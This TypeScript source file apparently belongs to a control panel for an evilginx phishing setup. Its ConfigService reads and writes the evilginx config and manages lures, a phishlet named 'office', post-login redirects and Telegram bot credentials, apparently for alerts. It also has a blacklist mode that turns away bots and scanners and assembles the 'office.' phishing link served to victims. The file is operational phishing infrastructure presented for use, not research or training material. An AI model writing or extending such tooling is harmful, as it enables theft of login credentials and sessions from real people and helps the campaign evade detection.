import * as fs from "fs";
import * as path from "path";
import chokidar, { FSWatcher } from "chokidar";
import type { Config } from "../types";

/* eslint-disable @typescript-eslint/no-unused-vars */
/**
 * Phishlet interface representing phishlet configuration
 * Used in configuration parsing
 */
interface Phishlet {
  hostname: string;
  unauth_url: string;
  enabled: boolean;
  visible: boolean;
}

/**
 * Lure interface representing lure configuration
 * Used in handling configuration from the evilginx service
 */
interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
}
/* eslint-enable @typescript-eslint/no-unused-vars */

export class ConfigService {
  private configPath: string;
  private blacklistPath: string;
  private dataDbPath: string;
  private blacklistWatcher: FSWatcher | null = null;
  private isInitialized: boolean = false;

  // Get the absolute paths to the original .evilginx directory
  private workspaceDir = path.resolve(process.cwd(), "../../..");
  private evilginxDir = path.join(this.workspaceDir, ".evilginx");
  private evilginxConfigPath: string;
  private evilginxBlacklistPath: string;
  private evilginxDataDbPath: string;

  constructor() {
    // Use only the local data directory, avoid accessing ~/.evilginx
    const dataDir = path.resolve(process.cwd(), "data");

    // Ensure data directory exists with proper permissions
    try {
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o755 });
    } catch (error) {
      console.error("Error creating data directory:", error);
      // Continue anyway, we'll handle file creation errors later
    }

    // Set paths for local files only
    this.configPath = path.join(dataDir, "config.json");
    this.blacklistPath = path.join(dataDir, "blacklist.txt");
    this.dataDbPath = path.join(dataDir, "data.db");

    // Original evilginx paths
    this.evilginxConfigPath = path.join(this.evilginxDir, "config.json");
    this.evilginxBlacklistPath = path.join(this.evilginxDir, "blacklist.txt");
    this.evilginxDataDbPath = path.join(this.evilginxDir, "data.db");

    console.log("Evilginx directory path:", this.evilginxDir);
    console.log("Config paths:", {
      panelDataPath: this.configPath,
      evilginxPath: this.evilginxConfigPath,
    });

    // Initialize files
    this.initializeFiles();

    // Only watch blacklist for changes, not config or data.db
    if (this.isInitialized) {
      this.setupWatchers();
    }
  }

  private initializeFiles() {
    try {
      // Create the default config if needed - ONLY if both local and evilginx files don't exist
      this.ensureConfigExists();

      // Create an empty blacklist if needed
      this.ensureBlacklistExists();

      // Create an empty data.db if needed
      this.ensureDataDbExists();

      this.isInitialized = true;
      console.log("File initialization completed successfully");
    } catch (error) {
      console.error("Error initializing files:", error);
      // Do not throw - we'll try to continue with limited functionality
      this.isInitialized = false;
    }
  }

  private ensureConfigExists() {
    try {
      // IMPORTANT: Never create or modify the config in the .evilginx directory
      // Only create a default config if BOTH panel and evilginx configs don't exist

      const evilginxConfigExists = fs.existsSync(this.evilginxConfigPath);
      const panelConfigExists = fs.existsSync(this.configPath);

      if (!evilginxConfigExists && !panelConfigExists) {
        console.log(
          "Both configs don't exist. Creating minimal default config."
        );

        // Create evilginx directory if it doesn't exist
        if (!fs.existsSync(this.evilginxDir)) {
          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
        }

        const defaultConfig: Config = {
          blacklist: { mode: "unauth" },
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "https://example.com",
          },
          phishlets: {},
          lures: [],
        };

        // Create config directly in .evilginx directory, not in panel/data
        fs.writeFileSync(
          this.evilginxConfigPath,
          JSON.stringify(defaultConfig, null, 2),
          { mode: 0o644 }
        );
        console.log(
          "Created default config.json in .evilginx directory at:",
          this.evilginxConfigPath
        );
      } else if (evilginxConfigExists && !panelConfigExists) {
        console.log(
          "Evilginx config exists but panel config doesn't - this is expected with symlinks"
        );
      } else if (!evilginxConfigExists && panelConfigExists) {
        console.log(
          "WARNING: Panel config exists but evilginx config doesn't exist!"
        );
      } else {
        console.log("Both configs exist - no action needed");
      }
    } catch (error) {
      console.error("Error ensuring config exists:", error);
    }
  }

  private ensureBlacklistExists() {
    try {
      // Similar approach to config - only create if both don't exist
      const evilginxBlacklistExists = fs.existsSync(this.evilginxBlacklistPath);
      const panelBlacklistExists = fs.existsSync(this.blacklistPath);

      if (!evilginxBlacklistExists && !panelBlacklistExists) {
        // Create evilginx directory if it doesn't exist
        if (!fs.existsSync(this.evilginxDir)) {
          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
        }

        // Create the file directly in .evilginx directory
        fs.writeFileSync(this.evilginxBlacklistPath, "", { mode: 0o644 });
        console.log(
          "Created empty blacklist.txt in .evilginx directory:",
          this.evilginxBlacklistPath
        );
      }
    } catch (error) {
      console.error("Error ensuring blacklist exists:", error);
    }
  }

  private ensureDataDbExists() {
    try {
      // Similar approach to other files
      const evilginxDataDbExists = fs.existsSync(this.evilginxDataDbPath);
      const panelDataDbExists = fs.existsSync(this.dataDbPath);

      if (!evilginxDataDbExists && !panelDataDbExists) {
        // Create evilginx directory if it doesn't exist
        if (!fs.existsSync(this.evilginxDir)) {
          fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
        }

        // Just create an empty file - the database service will handle initialization
        fs.writeFileSync(this.evilginxDataDbPath, "", { mode: 0o644 });
        console.log(
          "Created empty data.db in .evilginx directory:",
          this.evilginxDataDbPath
        );
      }
    } catch (error) {
      console.error("Error ensuring data.db exists:", error);
    }
  }

  private setupWatchers() {
    try {
      // Only watch blacklist for changes for now
      this.blacklistWatcher = chokidar.watch(this.blacklistPath, {
        persistent: true,
        ignoreInitial: true,
      });

      this.blacklistWatcher.on("change", () => {
        console.log("Blacklist file changed");
      });

      console.log("File watchers set up successfully");
    } catch (error) {
      console.error("Error setting up file watchers:", error);
    }
  }

  public async readBlacklist(): Promise<string[]> {
    try {
      if (fs.existsSync(this.blacklistPath)) {
        const content = fs.readFileSync(this.blacklistPath, "utf8");
        return content.split("\n").filter((line) => line.trim() !== "");
      }
      return [];
    } catch (error) {
      console.error("Error reading blacklist:", error);
      return [];
    }
  }

  public async writeBlacklist(ips: string[]): Promise<boolean> {
    try {
      const content = ips.join("\n");
      fs.writeFileSync(this.blacklistPath, content, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error("Error writing blacklist:", error);
      return false;
    }
  }

  public cleanup(): void {
    if (this.blacklistWatcher) {
      this.blacklistWatcher.close();
    }
  }

  public async readConfig(): Promise<Config | null> {
    try {
      // First try reading from the main source of truth - the .evilginx directory
      if (fs.existsSync(this.evilginxConfigPath)) {
        const configData = fs.readFileSync(this.evilginxConfigPath, "utf8");
        return JSON.parse(configData) as Config;
      }

      // If for some reason we can't access the .evilginx file, try the panel/data copy
      if (fs.existsSync(this.configPath)) {
        const configData = fs.readFileSync(this.configPath, "utf8");
        return JSON.parse(configData) as Config;
      }

      return null;
    } catch (error) {
      console.error("Error reading config:", error);
      return null;
    }
  }

  public async getFullLink(): Promise<{
    fullUrl: string;
    domain: string;
    path: string;
  } | null> {
    try {
      const config = await this.readConfig();
      if (!config) return null;

      // Add null checks for all properties
      const general = config.general || {};
      const domain = general.domain || "";
      const lures = config.lures || [];
      const path = lures[0]?.path || "";
      const fullUrl = domain ? `https://office.${domain}${path}` : "";

      return {
        fullUrl,
        domain,
        path: path.replace(/^\/+/, ""), // Remove leading slash for display
      };
    } catch (error) {
      console.error("Error getting full link:", error);
      return null;
    }
  }

  public async writeConfig(config: Config): Promise<boolean> {
    try {
      // ALWAYS write to the original .evilginx file, not the panel/data symlink
      const configStr = JSON.stringify(config, null, 2);

      // Make sure evilginx directory exists
      if (!fs.existsSync(this.evilginxDir)) {
        fs.mkdirSync(this.evilginxDir, { recursive: true, mode: 0o755 });
      }

      fs.writeFileSync(this.evilginxConfigPath, configStr, { mode: 0o644 });
      console.log("Successfully wrote config to:", this.evilginxConfigPath);
      return true;
    } catch (error) {
      console.error("Error writing config:", error);
      return false;
    }
  }

  public async updateTelegramSettings(
    botToken: string,
    chatId: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          general: {
            telegram_bot_token: botToken,
            telegram_chat_id: chatId,
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          blacklist: { mode: "off" },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure general object exists
      config.general = config.general || {};

      config.general.telegram_bot_token = botToken;
      config.general.telegram_chat_id = chatId;

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating telegram settings:", error);
      return false;
    }
  }

  public async updateBlacklistMode(blockBots: boolean): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          blacklist: { mode: blockBots ? "unauth" : "off" },
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure blacklist object exists
      config.blacklist = config.blacklist || {};

      config.blacklist.mode = blockBots ? "unauth" : "off";

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating blacklist mode:", error);
      return false;
    }
  }

  public async updateRedirectUrl(url: string): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: url,
          },
          blacklist: { mode: "off" },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure general object exists
      config.general = config.general || {};

      config.general.unauth_url = url;

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating redirect URL:", error);
      return false;
    }
  }

  public async updateLinkSettings(
    afterLoginRedirect: string,
    useCaptcha: boolean,
    linkPath: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        console.error("Config not found");
        return false;
      }

      // Check if lures array exists and has at least one item
      if (
        !config.lures ||
        !Array.isArray(config.lures) ||
        config.lures.length === 0
      ) {
        // Create a lure if none exists
        if (!config.lures) {
          config.lures = [];
        }
        config.lures.push({
          hostname: "",
          id: "",
          info: "",
          og_desc: "",
          og_image: "",
          og_title: "",
          og_url: "",
          path: linkPath,
          paused: 0,
          phishlet: "office",
          redirect_url: afterLoginRedirect,
          redirector: "main",
          ua_filter: "",
        });
      } else {
        // Update first lure
        config.lures[0].path = linkPath;
        config.lures[0].redirect_url = afterLoginRedirect;
      }

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating link settings:", error);
      return false;
    }
  }
}

// Create singleton instance
export const configService = new ConfigService();
